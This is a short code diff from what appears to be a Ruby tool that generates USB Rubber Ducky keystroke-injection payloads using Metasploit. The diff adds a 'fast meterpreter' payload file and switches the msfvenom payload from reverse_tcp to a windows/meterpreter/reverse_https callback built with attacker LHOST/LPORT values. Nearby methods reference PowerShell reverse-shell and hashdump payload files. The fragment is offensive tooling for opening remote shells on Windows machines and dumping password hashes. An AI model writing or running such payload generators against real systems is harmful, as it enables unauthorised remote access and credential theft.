@@ -35,6 +35,9 @@ module MainCommands
   def reverse_meterpreter_file
     'powershell_reverse_ducky.txt'
   end
+  def fast_meterpreter_file
+    'fast_meterpreter_ducky.txt'
+  end
   def hash_dump_file
     'hashdump_tcp.txt'
   end
@@ -130,7 +133,8 @@ module MsfCommands
       print_error('Metasploit Not Found!')
       exit
     end
-    @set_payload = 'windows/meterpreter/reverse_tcp'
+    #@set_payload = 'windows/meterpreter/reverse_tcp'
+    @set_payload = 'windows/meterpreter/reverse_https'
     print_info("Generating shellcode\n")
     execute  = `#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
     print_success("Shellcode Generated\n")
